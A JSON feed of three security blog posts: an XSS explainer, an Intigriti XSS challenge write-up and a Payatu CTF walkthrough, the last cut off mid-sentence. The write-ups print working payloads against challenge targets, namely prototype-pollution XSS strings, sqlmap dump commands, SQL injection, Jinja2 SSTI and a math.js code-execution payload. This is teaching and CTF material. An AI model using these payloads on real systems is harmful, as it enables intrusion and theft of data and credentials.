[
  
  {
    "title": "XSS : Types and Prevention",
    "url": "/posts/xss-types-and-prevention/",
    "categories": "OWASP Top 10",
    "tags": "xss-vulnerability, xss-attack, cross-site-scripting, owasp-top-10, cybersecurity",
    "date": "2023-07-17 00:00:00 +0530",
    





    
    "snippet": "XSS : Types and PreventionXSS aka Cross-site ScriptingSo, here I am, committed to my lovely beginner hacker friends, presenting my new blog where I explain the different types of XSS and discuss th...",
    "content": "XSS : Types and PreventionXSS aka Cross-site ScriptingSo, here I am, committed to my lovely beginner hacker friends, presenting my new blog where I explain the different types of XSS and discuss the prevention methods to mitigate XSS vulnerabilities. Let’s begin.What is Cross-Site Scripting?Cross-Site Scripting also known as XSS, is a web application vulnerability, that allows an attacker to inject malicious code into a web page that is viewed by other users. The injected code can execute in the user’s web browser and can potentially steal user’s information.What is a vulnerability?A vulnerability is a weakness in a system,network or application.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —What are the types of XSS?Types of XSS :Basically, there are 3 types.Reflected XSS (where the malicious script comes from the current HTTP request) :It is an simplest variety of XSS. It arises when an application receives data in HTTP request and includes that data within the immediate response in a unsafe way.Stored XSS (where the malicious script comes from the website’s database) :Also known as persistent or second-order XSS arises when an application receives data from an untrusted source and includes that data within it’s later HTTP responses in an unsafe way.DOM XSS (where the vulnerability is in the client-side code rather than server-side code) :This type of XSS arises when an application contain some client-side JavaScript that processes data from an untrusted source in an unsafe way,usually by writing the data back to the DOM.What is DOM?The Document Object Model is a programming interface for web documents. It represents the page so that programs can change the document structure, style, and content.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —How to Prevent XSS Attacks?XSS Prevention :There are several ways to prevent XSS attacks:Input Validation : This involves checking user input and ensuring that it meets the required criteria.For example, if a form expects a phone number, the input should be a valid phone number and it should be checked properly.2. Output Encoding : This involves converting special characters in user input into their HTML or JavaScript equivalents, so that the input is displayed as plaintext and not interpreted as code.3. Content security policy : This is a security feature that allows a website to specify which resources are allowed to be loaded and executed by the web browser. It can also be used to block the execution of malicious code.4. Use of frameworks and libraries : Many web development frameworks and libraries include built-in protection against XSS attacks.For example : Django web framework for Python includes a automatic cross-site scripting protection system.5. Regular security testing : Regular security testing of web applications can help identify and fix vulnerabilities before they can be exploited by the attackers. This can include both manual testing and the use of automated tools.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Peace !!— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Learning resources from where you can learn and practice more on XSS vulnerability for free :What is cross-site scripting (XSS) and how to prevent it? | Web Security AcademyTryHackMe | OWASP Juice ShopTryHackMe | OWASP Top 10TryHackMe | That&#39;s The TicketTryHackMe | The MarketplaceTryHackMe | MD2PDF— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Update on my last blog :I was one of the winner for the June’s XSS Challenge for the best writeup category and I won a €50 swag voucher from Intigriti. https://twitter.com/intigriti/status/1673629210005446657— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —"
  },
  
  {
    "title": "Intigriti’s June XSS challenge: Writeup",
    "url": "/posts/intigriti-s-june-xss-challenge-writeup/",
    "categories": "Web Exploitation, Bug Bounty",
    "tags": "xss-challenge, bug-bounty, prototype-pollution, xss-attack, intigriti",
    "date": "2023-06-27 00:00:00 +0530",
    





    
    "snippet": "Intigriti’s June XSS Challenge By @0xGodson_ (https://challenge-0623.intigriti.io/)Hello everyone, I hope you all are doing great things and learning new things everyday just like me. So I am here ...",
    "content": "Intigriti’s June XSS Challenge By @0xGodson_ (https://challenge-0623.intigriti.io/)Hello everyone, I hope you all are doing great things and learning new things everyday just like me. So I am here with my new and freshly written writeup blog on Intigriti’s June XSS Challenge published by @0xGodson_ on Intigriti platform.— — — — — — — — — — — — — — — — — — — — — — — — — — — —Introduction :The following is my write-up for the June 2023 Intigriti XSS challenge.Challenge URL : https://challenge-0623.intigriti.io/challenge/index.htmlTimeline of the challenge :Find a way to execute arbitrary javascript on the challenge page and win Intigriti swag.Rules :This challenge runs from the 19th of June until the 26th of June, 11:59 PM CET.Out of all correct submissions, we will draw six winners on Tuesday, the 27th of June:* Three randomly drawn correct submissions* Three best write-upsEvery winner gets a €50 swag voucher for our swag shop .The winners will be announced on our Twitter profile.For every 100 likes, we’ll add a tip to announcement tweet.Join our Discord to discuss the challenge!The solution…Should work on the latest version of Chrome.Should execute alert(document.cookie).Should leverage a cross site scripting vulnerability on this domain.Shouldn’t be self-XSS or related to MiTM attacks.Should be reported at go.intigriti.com/submit-solution.Should require no user interaction.— — — — — — — — — — — — — — — — — — — — — — — — — — — —Let’s Do some Enumeration First…The challenge takes place on a single web page hosted at https://challenge-0623.intigriti.io/challenge/index.html. This web page presents a dynamic interface that will test our skills in identifying and exploiting web application vulnerabilities.The distinctive feature of the page is a facility to welcome you with your name as a popup message.Okay, it appears that the page is straightforward, allowing users to enter their name as input in a text field.Before clicking submit button and entering test in an input fieldUpon submission, a popup message greets the user with their inputted name.After clicking submit button inputted name test pops upBefore proceeding with the enumeration, let’s examine the conditions that must be met for the solution to be accepted as a submission:Compatibility : The solution should work on the latest version of Chrome based on your distribution.Execution of Code : The solution should successfully execute the code “alert(document.cookie)”.Cross-Site Scripting Vulnerability: The solution should leverage a cross-site scripting vulnerability specific to the domain in question.Avoidance of Self-XSS and MiTM Attacks: The solution should not be susceptible to self-XSS or related to Man-in-the-Middle (MiTM) attacks.Okay, before we proceed with the last two conditions, let’s take a moment to address a common question that may arise among our beginner hacker friends: What is self-XSS ? So, let’s derive the definition of self-XSS.What is self-XSS ?The term “self-XSS” refers to a type of XSS (Cross-Site Scripting) vulnerability that occurs when an attacker tricks a user into executing malicious code within their own browser. In self-XSS attacks, the user is typically convinced to manually enter or paste malicious code into their browser’s developer console or address bar.5. Reporting : The solution should be reported at go.intigriti.com/submit-solution.6. User Interaction : The solution should not require any user interaction to function correctly.By ensuring that our solution should satisfies these conditions, we can proceed further confidently with the enumeration process.Okay, before we proceed further, let’s take a moment again to address a common question that may arise among our beginner hacker friends: What is cross-site scripting (XSS)? So, let’s cease for a moment and derive the definition of cross-site scripting to gain a deeper understanding.What is Cross-Site Scripting?Cross-Site Scripting also known as XSS, is a web application vulnerability, that allows an attacker to inject malicious code into a web page that is viewed by other users. The injected code can execute in the user’s web browser and can potentially steal user’s information.Now that we have defined cross-site scripting, another question that may arise is the meaning of the term “vulnerability.” Let’s take a moment to define what a vulnerability is as well.What is a vulnerability?A vulnerability is a weakness in a system,network or application.During our previous examination of the web application domain, we observed that when users enter their name in a text field, it is reflected back to them in the form of a greeting popup. This reflection occurs without undergoing proper sanitization or validation. Consequently, we can conclude that the input field in the web application domain is vulnerable to Reflected XSS.Halted. So, let’s take a moment to understand the meaning of the term “Reflected XSS.”What is Reflected XSS?It is an simplest variety of XSS. Reflected XSS (Cross-Site Scripting) is a type of web vulnerability that occurs when user-supplied data is echoed back to the user without proper sanitization or validation, allowing malicious code to be executed within the victim’s browser.Now, that we have confirmed that input field in the web application domain is vulnerable to Reflected XSS, we can utilise malicious JavaScript code such as the following :&lt;script&gt;alert(1)&lt;/script&gt;Let’s utilise that payload by entering it into the name input field. Let’s see what we get.Before clicking submit button and inputting the payloadAfter submission the output we getAs we can observe from the above screenshot, the alert(1) payload was executed, but it did not provide any response in the form of a popup message displaying 1. Instead, it displayed a blank response with a popup. Based on this observation, we can conclude that input sanitization has been handled properly. However, this raises a question regarding input validation.Pause. Before we proceed, let’s pause for a moment to easily grasp the concepts of input sanitization and input validation, as well as understand the difference between the two.What is Input sanitization?Input sanitization refers to the process of filtering and modifying user input to remove or neutralize any potentially malicious or unintended content that could be executed as code within a web application.What is Input Validation?Input validation focuses on verifying the correctness and integrity of user input. It involves checking the format, length, and type of input data to ensure it meets the expected criteria. Validation can be done through regular expressions, predefined rules, or custom logic.Difference between Input Sanitization and Input Validation :The difference between input sanitization and input validation lies in their goals and approaches:Input sanitization primarily aims to neutralize or eliminate any potential malicious code that can be embedded in user input. It focuses on cleaning the input to prevent code injection attacks like XSS.Input validation, on the other hand, focuses on checking the integrity and correctness of the input. It ensures that the input meets specific criteria or conforms to expected patterns, regardless of whether it contains malicious code or not.In summary, input sanitization is concerned with removing or neutralizing malicious code, while input validation focuses on verifying the correctness and conformity of the input data. Both measures are crucial for securing web applications against XSS attacks.Now that we understand the terms input sanitization and input validation and their differences, let’s proceed to enumerate the input validation mechanisms by viewing the page source of the web application domain. To open the page source of the web application domain, you can press CTRL+U on your keyboard or right-click on the page and select the View Page Source option from the available menu.Source code of a web application domainSo, as we can observe from the above screenshot, we have three files to look for, which are present under the &lt;script&gt; tag in the source code of the web application domain. The three files available to view are located on the /static/ endpoint of the web application domain.Therefore, as we can observe from the above screenshot, we have one CSS file named tailwind.min.css and the other two files are JavaScript files named jquery-2.2.4.js and jquery-deparam.js respectively.From my experience in solving web challenges during CTF, I should mention that CSS files handle how HTML elements are displayed on the screen, paper, or other media. On the other hand, JavaScript files contain JavaScript code for execution on web pages.Considering this, I believe the JavaScript files could be a point of interest to look at first, rather than the CSS file, as we are trying to find the input validation code mechanism.So, let’s look at the JavaScript files one by one. First, let’s examine the jquery-2.2.4.js file. Let’s see what it contains.Source code of file jquery-2.2.4.jsBased on the provided screenshot, we can conclude that the web application domain is using the jQuery JavaScript Library v2.2.4. Now, we know the exact version of jQuery, which is the most commonly used library in the JavaScript language. Let’s proceed with our second JavaScript file named jquery-deparam.js and examine its contents. Let’s see what it contains.Source code of jquery-deparam.jsBased on the provided screenshot, we can conclude that the web application domain uses the jquery-deparam method. This method serves as an inverse of jQuery’s $.param method and is used to convert a query string into a JavaScript object, which is included in the jquery-deparam.js file.So, from the two JavaScript files, we have learned about the version of jQuery from jquery-2.2.4.js and also the method of jQuery it utilises from jquery-deparam.js.So, let’s research the jquery-deparam method of jQuery on Google, as Google is our trusted ally in hacking.&quot;Googling jquery deparam methodFrom the above screenshot, we have found that there is a prototype pollution in the jquery-deparam method, which seems to be interesting to look into. Let’s go deeper into it and see what it’s all about.Upon landing on Snyk’s page, we can learn more about the Prototype Pollution vulnerability that affects JavaScript method jquery-deparam.Prototype Pollution affecting JavaScriptHold on. Let’s take a moment to understand the meaning of the term “Prototype Pollution”.What is Prototype Pollution?Prototype Pollution is a vulnerability or a type of security issue that occurs in some programming languages, especially those that support object-oriented programming and prototype-based inheritance. It occurs when a software application or system allows an attacker to modify the behavior of existing objects or classes by injecting malicious values into their prototypes.In simpler terms, Prototype Pollution refers to the ability to manipulate or pollute the prototype of an object, leading to unintended consequences in the application’s behavior. Attackers can exploit this vulnerability to modify or add properties and methods to objects that may be used throughout the application. This can result in various security risks, such as remote code execution, privilege escalation, or denial-of-service attacks.Developers need to be aware of this vulnerability and take preventive measures, such as proper input validation, sanitization, and implementing secure coding practices, to mitigate the risk of Prototype Pollution in their applications.Now that we understand the concept of Prototype Pollution, let’s move ahead and explore how we can exploit it. Furthermore, if you want to learn more about how this vulnerability works on the JavaScript method jquery-deparam, you can read more about it here.Snyk Vulnerability Database | Snykcve-websiteNow, based on the initial reconnaissance, we know that the web application domain is vulnerable to Reflected XSS. Therefore, there is a possibility of a Reflected XSS vulnerability via the Prototype Pollution vulnerability in the web application’s domain name input field. Additionally, it is important to note that there is a CVE (Common Vulnerability Exposure) assigned to the Prototype Pollution vulnerability, specifically affecting JavaScript’s jquery-deparam method (CVE-2021–20087). Further investigation into this CVE revealed that an attacker can exploit the Prototype Pollution vulnerability in the JavaScript jquery-deparam method by injecting properties into Object.prototype.Based on the references provided by Snyk and cve.org, we can read and learn more about the vulnerable code fragment and check the Proof of Concept on the provided links :jquery-deparam/jquery-deparam.js at 81428b3939c4cbe488202b5fa823ad661d64fb49 · AceMetrix/jquery-deparamclient-side-prototype-pollution/pp/jquery-deparam.md at master · BlackFan/client-side-prototype-pollutionBy taking a look at the vulnerable code fragment, we also have a Proof of Concept mentioned below the vulnerable code fragment that we can use to exploit the Reflected XSS via Prototype Pollution vulnerability, as follows :Proof of Concept for CVE-2021–20087But when we use the aforementioned Proof of Concept, we are unable to achieve the goal of retrieving the cookie value from the document.cookie variable mentioned in the source code of the main page, which is as follows :Source code of main page (https://challenge-0623.intigriti.io/challenge/index.html)So, I first tested the existence of the Reflected XSS via Prototype Pollution vulnerability by following the research on Prototype Pollution and the mentioned Proof of Concept from the Snyk’s reference link. I determined whether it is vulnerable or not by utilising the provided information.s1r1us - Prototype PollutionWhile reading the research, I discovered that the web application domain was vulnerable. I confirmed this by identifying the vulnerable library, which you guys can refer to here:s1r1us - Prototype PollutionAnd when I followed the same steps mentioned in the research blog post on the vulnerable web application domain, I obtained the expected output as described in the research blog post.Blocking the JS resource request in Chrome and setting Debugger breakpoint when the property is Object.Prototype.No worries, this was quite a technical part. However, after setting a breakpoint, we have the next step to follow, which is finding the script gadgets.What are gadgets in the context of prototype pollution?In the context of prototype pollution, gadgets refer to specific code snippets or components that can be manipulated or abused to exploit vulnerabilities and potentially compromise the security or integrity of an application or system. These gadgets are typically used in attacks that target the prototype chain of an object-oriented programming language.So, to find the script gadgets, I used the following reference to exploit the Reflected XSS via Prototype Pollution vulnerability. I employed a Proof of Concept of jQuery, as one of its libraries named deparam was vulnerable.client-side-prototype-pollution/gadgets/jquery.md at master · BlackFan/client-side-prototype-pollutionThe payload I used to exploit was as follows: I checked whether it successfully retrieves the domain or not. In fact, it did, so I added document.cookie to the payload to fetch the value of the document.cookie variable. Consequently, it turned out to be a successful payload.Payload used for retrieving document.domain and document.cookie variableThe following payload retrieves the web application’s domain.?__proto__[preventDefault]=x&amp;__proto__[handleObj]=x&amp;__proto__[delegateTarget]=&lt;img/src/onerror%3dalert(document.domain)&gt;Screenshot for the value of document.domainThe following payload retrieves the web application’s cookie.?__proto__[preventDefault]=x&amp;__proto__[handleObj]=x&amp;__proto__[delegateTarget]=&lt;img/src/onerror%3dalert(document.cookie)&gt;Screenshot for the value of document.cookieHence, we successfully completed the XSS challenge given by @0xGodson_Also I want to give a huge shout out to the awesome people who has done a good job in researching, making a Proof of Concepts and security awareness about vulnerabilities among all hackers :Intigriti : for organising a nice weekly challenges on different web application vulnerabilities such as XSS, etc.Snyk : for the awesome library of CVE’s maintained which affects the projects and client-side libraries.s1r1us : for his awesome research on Prototype Pollution which helped me to figure out the Prototype Pollution Vulnerability.BlackFan : for his awesome research and making a Proof of Concept on client-side prototype pollution.HoLyVieR : for making an awesome research paper and a talk on Prototype Pollution.— — — — — — — — — — — — — — — — — — — — — — — — — — — —Note : I will explain different types of Cross-Site Scripting in my next blog so stay tuned for the blog my lovely beginner hacker friends and all. :)— — — — — — — — — — — — — — — — — — — — — — — — — — — —Peace !!— — — — — — — — — — — — — — — — — — — — — — — — — — — —Resources Used in the blog :https://twitter.com/intigriti/XSSChallenge 0623 by 0xGodson_ - Bug Bounty Program - IntigritiSnyk Vulnerability Database | Snykcve-websitejquery-deparam/jquery-deparam.js at 81428b3939c4cbe488202b5fa823ad661d64fb49 · AceMetrix/jquery-deparamclient-side-prototype-pollution/pp/jquery-deparam.md at master · BlackFan/client-side-prototype-pollutionclient-side-prototype-pollution/gadgets/jquery.md at 004bf5353f6f30b720f3d68c5aca5191531f35d6 · BlackFan/client-side-prototype-pollutionhttps://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdfs1r1us - Prototype Pollution— — — — — — — — — — — — — — — — — — — — — — — — — — — —Intigriti’s June XSS challenge: Writeup was originally published in System Weakness on Medium, where people are continuing the conversation by highlighting and responding to this story."
  },
  
  {
    "title": "Payatu Hiring CTF 2022: Challenges Writeup",
    "url": "/posts/payatu-hiring-ctf-2022-challenges-writeup/",
    "categories": "CTF, Hiring CTF",
    "tags": "Payatu Hiring CTF",
    "date": "2022-10-16 00:00:00 +0530",
    





    
    "snippet": "Babysqli, Stardust, EasyCalc, Mistake-1 and Mistake-2Hello everyone, I hope you are all doing great things and learning every day, just like me. So I hereby came with my new and fresh blog again on...",
    "content": "Babysqli, Stardust, EasyCalc, Mistake-1 and Mistake-2Hello everyone, I hope you are all doing great things and learning every day, just like me. So I hereby came with my new and fresh blog again on Payatu Hiring CTF challenges walkthroughs. I solved 8 challenges out of 30 challenges which consists of Babysqli, Stardust, EasyCalc, Mistake-1 and Mistake-2, Catch Me If You Can and so on and I secured 12th rank. I will be walking you through the challenges from Web and Network category which consists the following :Web Challenges :BabysqliStardustEasyCalcNetwork Challenges :Mistake-1Mistake-2Payatu Hiring CTF Platform (https://ctf.payatu.com/)Prizes For The Winners :Introduction :Timeline of the CTF :The CTF will start at 9:00 AM on 15th October 2022 and end at 9:00 PM (12 Hours)There are multiple tracks of challenges. Start with the one you are comfortable with and ride your way up to the top.Do not attack the CTF platform or deliberately perform actions that might lead to the platform/challenges being unavailable for other players.Rules :Any kind of flag sharing/cheating will lead to disqualification.Any request to consider allotment of points for challenges solved but flag not submitted will not be entertained.Winning / Being in the top list of the leaderboard will only help you land an interview with Payatu. You will have to clear the interviews to get the job offer.This is an individual event, and team participation is not allowed.Anyone can play the CTF, but the hiring is limited to only Indian Participants.Let’s begin the writeup first with web challenges. Let’s get started.Web Category :-Babysqli:-Babysqli Challenge DescriptionLet’s start with Babysqli from Web challenge. First things first I visited the provided link to the challenge and I land at this page which is as under:Simple Login Page from http://babysqli.payatu.lol/By exploring the website for quite sometime, I noticed that it is vulnerable to MySQL Injection by looking at the source code which is mentioned at the end of the page.Source Code for MySQL databaseSo after looking at the source code the query field has equipped some filters which are as under :$query = &#39;SELECT * FROM users WHERE username=&quot;&#39;.$user.&#39;&quot; AND password=&quot;&#39;.$pass.&#39;&quot;&#39;;So if anyone who will run the payloads like this&#39; or 1 or &#39;admin&#39; || &#39;1&#39; == &#39;1 &#39; || &#39;1&#39;== &#39;1will tend fail as it is opposed by the filters equipped. So I have two options to exploit MySQL either by using automated tool called sqlmap or manual injection. So I used sqlmap for exploiting this type of SQL injection.Firstly, I will enumerate forms by running following command :sqlmap -u http://babysqli.payatu.lol/ --formsEnumerating FormsNow, I took the next step to dump databases by running following command :sqlmap -u http://babysqli.payatu.lol/ --forms --dbsEnumerating DatabasesNow after enumerating databases, I have to enumerate how many tables are there in a particular database but there are 3 databases to choose so which one to choose is a question standing. So I choose &quot;babysqli&quot; database because I feel that it may contain juicy data to extract like users, passwords, etc. So, now I will enumerate tables of database &quot;babysqli&quot; with the following command :sqlmap -u http://babysqli.payatu.lol/ --forms -D babysqli --tablesEnumerating TablesNow, as there is only one table called &quot;users&quot; we can enumerate the columns for a particular table by the following command :sqlmap -u http://babysqli.payatu.lol/ --forms -D babysqli -T users --columnsEnumerating columnsNow, finally I will dump the data from the columns by following command :sqlmap -u http://babysqli.payatu.lol/ --forms -D babysqli -T users -C id,username,password --dumpGot the password of all the usersBut unfortunately none of them have flag inside their accounts. So, I basically copied the payload from the sqlmap output and successfully logged into by pasting the following payload in the username and password field for the account and I found the flag from the source code.xYPs&quot; UNION ALL SELECT NULL,CONCAT(0x7178626b71,0x6478697349625a4d527266625861596455566c704b4c714f65684777674d737145747a614b6a6159,0x7176707171),NULL#Congratulations message for solving the challengeFinally flag for BabySqli challenge was capturedVoila I have successfully captured the babysqli challenge flag with the help of sqlmap.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Stardust:-Stardust Challenge DescriptionLet’s start with Stardust from Web challenge. First things first I visited the provided link to the challenge and I land at this page which is as under:Landing page of http://stardust.payatu.lol/By exploring the website for quite sometime, I noticed that there are 6 chapters for Dev Wars which points to the different location on the main page. Let’s say for example if I clicked Chapter 1 from the main page it goes to different location which is (http://stardust.payatu.lol/chapter?episode=the+phantom+feature) in case of Chapter 1 and so on and so forth. Now when I visited Chapter 1 link there was one parameter which was important to look at and that was &quot;episode&quot;. So by looking at the Chapter 1 link (http://stardust.payatu.lol/chapter?episode=the+phantom+feature)for sometime I noticed that it runs a episode of Chapter 1 and the page is at still showing the contents of the episode.Playing episode 1 from Chapter 1So I decided that why not explore &quot;episode=&quot; parameter by giving &quot;&#123;&#123;9 * 9&#125;&#125;&quot;as payload and it gave the product of &quot;9 * 9&quot; which is 81 as output.Product of 9 multiplied by 9So by observing this I thought that the &quot;episode&quot; is vulnerable to SSTI vulnerability aka Server Side Template Injection. So I decided to exploit it via some SSTI payloads. So I decided to use a very good writeup from HackIT CTF 2018 on ctftime.org published by the user kazkiti on SSTI payloads which he explained everything very nicely in detail manner on how to identify the vulnerability to how to get the flag at the end by exploiting SSTI.Little glance of the CTF writeup published by the user kazkiti on ctftime.orgSo first things first as I observed that the web application is vulnerable to SSTI, then I decided to follow along by reading the writeup thoroughly andI moved further with the first payload which is &quot;&#123;&#123;__self__.__doc__&#125;&#125;&quot; by appending it to after &quot;episode=&quot; parameter whether the web application is using Jinja2 or not. Voila it successfully gave me a Jinja2 error which is as under :Error confirms that it is Jinja2 running in the backendSo after confirming that it’s Jinja2 I can either use HackTricks blog on SSTI payloads or the payloads which the writeup I discussed earlier have mentioned in their writeup. So, I will use the payloads which the writeup which I discussed earlier have mentioned as a weapon as it gave us an idea how an SSTI is successfully exploited step-by-step. So as per the writeup, I used the second payload which is &quot;&#123;&#123;self&#125;&#125;&quot; after &quot;episode=&quot; as under :Trying “&#123;&#123;self&#125;&#125;” as the second payloadAs I can observe here that it shows &lt;TemplateReference None&gt; as output when I typed &quot;&#123;&#123;self&#125;&#125;&quot;. So for more information, I would recommend to read the documentation on Jinja2 and a writeup where the same person who I have took the reference of has mentioned in their previous writeup.Moving along I passed the third payload which is &quot;&#123;&#123;config&#125;&#125;&quot; after &quot;episode=&quot; I got the following as follows :Passing &#123;&#123;config&#125;&#125; as the third payloadFinally I have successfully captured the flag when I typed &quot;&#123;&#123;config&#125;&#125;&quot; as a parameter value. So the flag is as under :Finally flag for Stardust challenge was captured— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —EasyCalc:-EasyCalc Challenge DescriptionLet’s start with EasyCalc from Web category. First things first I visited the provided link to the challenge and I land at this page which is as under:Landing page of http://easy-calc.payatu.lol/By exploring the website for quite sometime, I noticed that it’s a simple page which has a calculator functionality to compute simple operations such as addition, subtraction, division and multiplication and trigonometric operations such as sin, cos and tan.So I tried to google search the writeups of the any previous CTF’s if they have anything related to bypass this simple calculator functionality and I found some interesting results which are as under :Google Search Results for Simple Calculator CTF writeupsSo later on I decided why not I should check the source code of the page and so I checked the source code and there I found some script tags which contains the following code:JavaScript CodeAlso from the source code I found some important thing to note which is the input tag in which the value is nothing but I came across the word &quot;disabled&quot;.Interesting thing I noted here about why is disabled here.After sometime I thought that why not make some changes in the input tag by adding &quot;enabled=enabled&quot; by removing &quot;disabled&quot; from the input tag by inspecting the element as in the view page source we can’t make any changes and let’s see what we get. We got following as output :Removing disabled and adding enabled in the input tagAnd one other thing notice is that now I can type in the input whatever I want like alphabets,etc but it will throw an error because it requires a mathematical operations like 7+7, etc and not the random alphabets and special characters.Now here I was little bit stuck because I have read many writeups based on simple calc by googling the same. But afterwards I got one idea why not I should check Network tab for what’s happening behind the scenes. So I tried simple math addition between numbers and I got the following output in the Network Tab :So now it’s clear that I have to exploit nodejs whereby nodejs has a extensive math library called math.js. So ultimately I have to exploit math.js in short with some payloads which return output as &quot;[Object][object]&quot;. So I googled for math.js exploit on Google and I found this as output as google search results :I used https://jwlss.pw/mathjs for exploiting math.js library. So I read the context and applied the same to web application from the blog post. Now from the article I can relate that math.js has a vulnerability of Remote Code Execution so let’s get our hands dirty and exploit the math.js library through our web application and solve the challenge successfully. Also I noticed further that &quot;query=&quot;is vulnerable and so I can exploit it by using the payloads which was mentioned in the article which I have read earlier.Now I will make my hands dirty and exploit query field by passing this as payload &quot;cos.constructor(\\&quot;return process.env\\&quot;)()&quot; and let’s see what we get as output :Request for changing query field contentRequest after sending the payload in query fieldResponse after sending payload in the query fieldFinally flag for EasyCalc was capturedVoila we have successfully solved all the web challenges. Now it’s time to solve challenges from Network category.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Network Category :-Mistake-1:-Mistake -1 Challenge DescriptionLet’s start with Mistake-1 from Network category. First things first I visited the provided link to the challenge and I land at this page which is as under:Landing page of https://mistake.payatu.lolBy exploring the website for quite sometime, I noticed that it’s a static page which seems like a normal portfolio page of a user. I quickly checked the functionality of the page whether any content is clickable or not and I found that some content is clickable and some isn’t. So I figured out that home page, about me, etc is clickable whereas when I click on social media handles like Twitter, Facebook, Google+ and Linkedin turns out to be unclickable as it is an unclickable content but interestingly I found that except for social media handles there also possess GitLab handle which points the link to the GitLab account of the user named Sad Detail.Clicking on social media handles such as Twitter,Facebook,Google+ and Linkedin turns out to be nothing interestingBut apart from social handles,GitLab has a link to visit to https://gitlab.com/saddetailLet’s visit the GitLab link which points to user Sad Detail’s GitLab account. By visiting the user account I found that there is only one single repository which is his my-portfolio as it is also hosted on the website from which I came from.By visiting GitLab page,we got the GitLab user named Sad DetailThe user named Sad Detail possess only one repository named my-portfolio in his GitLab accountOverview of GitLab repository named my-portfolioLet’s explore my-portfolio repository of user Sad Detail, so I was greeted with these files and folders in his repository. So I got one idea that as GitHub and GitLab possess similar functionality of managing commits by maintaining commit logs so why not explore the history of the commit from the starting point. So I just clicked the repository name and then I clicked history and thus I was greeted with more commits which are older than the present one which I was currently on.Clicking on my-portfolioClicking on history to view the other commits for the repositoryThe following screenshot shows the order of commits that were created by the user Sad Detail for their my-portfolio repository. I noticed that one commit seems to be useful among 8 commits that were made in total. The commit that was interesting according to me was “damn, never thought people at NULLCON would crack it so easily. My security…” as I marked the keyword &quot;NULLCON&quot; in the commit description.Order of commits which are made for my-portfolio repositoryLuckily I got my instinct correct and it was an interesting commit with some nice changes made.Clicking on damn, never thought people at NULLCON would crack it so easily. My security consultant friends were right commit to look further what’s inside and what were the changes madeAfter exploring the NULLCON keyword commit, I was greeted with some nice 6 deletions and 0 deletions in the index.html file.At first glance, we see that there is one index.html file which contains some interesting content with 6 deletions and 0 additionsLooking closer to the index.html file, I found that there is some base64 encoded string commented in the file which might be useful. So I copied that string for future use in Sublime Text editor.Base64 encoded stringWithout wasting any time I spinned up CyberChef on the browser and I just pasted the string which I copied earlier into the input field with some proper formatting. Voila when I pasted the string I got a suggestion from a CyberChef that it is definitely a base64 encoded string which can be decoded as a normal string.Placing base64 encoded in CyberChef for decoding itAfter decoding base64 stringAfter decoding the base64 encoded string, I got the following message as the output shown below:Message after decoding from base64 stringNow what to do next after getting this message. So I first thought that this must be it for the challenge so I submitted the flag as &quot;flag&#123;take-a-few-pages-from-my-book&#125;&quot;. But sadly it was not as expected as in the challenge description there was some interesting note given by the challenge author and also it’s a Network category challenge so the flag might be incorrect in that respect.By reading the note mentioned in the challenge description, I again picked the two keywords which were Room no. 22 and Room no. 9922 which ultimately states that Room no.22 is under repair aka SSH Default port 22 is under repair whereas you can check Room no. 9922 instead states that it was an another SSH port in exception of SSH default port 22. Wait what! I was puzzled at that moment. So I just checked port 9922 real quick by visiting it by appending to the actual website which in turn result into like this as under :It was redirected to ssh version information and then it was a connection resetFor further enumeration we can also check via nmap (Network Mapper Tool) use for scanning ports and services. Thus I concluded that port 9922 is a ssh port open for ssh login.Nmap resultSo I move further and tried to login via ssh. But wait what should be the credentials for ssh login? So I just visited my notes again what I have so far in my notes to be use for ssh login. So while reading I found that the message which I got at the time of decoding the base64 string via CyberChef was pointing somewhere around password. So I thought there is a password present in the message which I found in the following screenshot :Password for user Sad Detail found from one of GitLab commitsSo voila I made a username:password pair and thus I got &quot;saddetail:take-a-few-pages-from-my-book&quot; as a successful password pair and I achieved a successful login in a ssh session.Successful Login with the creds saddetail:take-a-few-pages-from-my-bookls command not found error as the shell is rbashAfter logging in,I tried to enumerate the file system for finding the flag by using directory listing command &quot;ls&quot; but it failed and it simply throws an error of command not found. So I was little stuck here on how to move further. Also I observed something weird from the command not found error that it is a restrictive bash shell as it throws an error when I typed &quot;ls&quot;in the terminal and not the normal bash shell. So I decided to take a reference from my writeup on Recovery room on TryHackMe where there was a similar scenario.GitHub - Bornunique911/THM-RecoveryTaking TryHackMe room named Recovery writeup made by me as a referenceIt gives me an error as it is not a normal bash shell but a rbash shell aka restricted bash shellSo by taking the reference from my writeup, I exited the ssh session and I tried to append &quot;/bin/bash&quot; in the ssh command shown in the screenshot above and it failed.ssh saddetail@mistake.payatu.lol -p 9922 &quot;/bin/bash&quot;So I got another idea like what if I try to run a directory listing command &quot;ls -la&quot; by appending it in the ssh command.ssh saddetail@mistake.payatu.lol -p 9922 “ls -la”Voila it got successful finally and I get the listing of the files and directories including flag.txt file. For further step, for capturing the Mistake-1 flag, I just append to the previous command &quot;ls -la;cat flag.txt&quot;ssh saddetail@mistake.payatu.lol -p 9922 “ls -la;cat flag.txt”It was successful when I tried directory listing of files and directoriesAlso I got a flag file while directory listingFinally flag for Mistake-1 challenge was capturedVoila after executing the above command, I successfully got the Mistake-1 flag.— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —Mistake-2 :-Mistake-2 Challenge DescriptionAs I captured the Mistake-1 flag, I moved further with Mistake-2 challenge from the Network category. Let’s start.In Mistake-1, I got the flag from the user’s home directory without entering into a ssh session. So I thought now in Mistake-2 challenge, I have to escalate the privileges to root. So I have to logged into a stable ssh session for privilege escalation as the ssh session shell is rbash. In simple words, I have to escape rbash shell in the ssh session to bash shell. So to do that I searched for all the possible results for rbash shell escaping via Google Search but none work except for one which is as under:rbash shell esacpingSteps to escape rbash shellSuccessfully entered into a bash shell by the steps mentionedSo as I have entered a bash shell then I can simply run &quot;sudo -l&quot; and the result for the same is as follows:Privilege Escalation To Root “sudo -l” outputAs I observed that SETENV is enabled,I can change the root user’s environment variables.Contents of script.pyFrom the above 